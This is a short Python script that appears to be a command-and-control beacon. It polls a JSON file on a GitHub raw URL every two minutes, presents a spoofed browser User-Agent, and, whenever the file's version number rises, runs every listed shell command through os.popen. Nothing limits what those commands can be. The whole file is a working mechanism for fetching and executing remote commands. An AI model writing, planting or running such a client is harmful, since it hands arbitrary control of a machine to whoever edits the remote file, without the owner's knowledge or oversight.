import time
import json
import os
import signal
import urllib.request

listen_url = "https://raw.githubusercontent.com/celestix/cc_rs_chan/refs/heads/main/channel.json"
interval_time = 120

# read the current state of version from file
# or create a new one if it doesn't exist
version = 0
if not os.path.exists("version"):
    with open("version", "w") as f:
        f.write("0")
else:
    with open("version", "r") as f:
        version = int(f.read() or 0)
    
print(f"Current version: {version}")
    
def handle_update(res):
    with open("version", "w") as f:
        f.write(str(version))
    cmds = res["cmd"]
    for cmd in cmds:
        print(f"Executing command: {cmd}")
        # execute command and get output
        output = os.popen(cmd).read()
        print(f"Command executed: {cmd}")
        print(f"Output: \n{output}")
    
req = urllib.request.Request(listen_url)
req.add_header('Cache-Control', 'max-age=0')
req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36 Edg/132.0.0.0')
    
try:
    while True:
        urllib.request.urlcleanup()
        with urllib.request.urlopen(req) as response:
            res = json.load(response)
        print(res)
        if res["version"] > version:
            version = res["version"]
            handle_update(res)
        else:
            print(f"No new update available... sleeping for {interval_time} secs")
        time.sleep(interval_time)
except KeyboardInterrupt:
    print("Saving version:", version)
    with open("version", "w") as f:
        f.write(str(version))
    print("Exiting...")
    exit(0)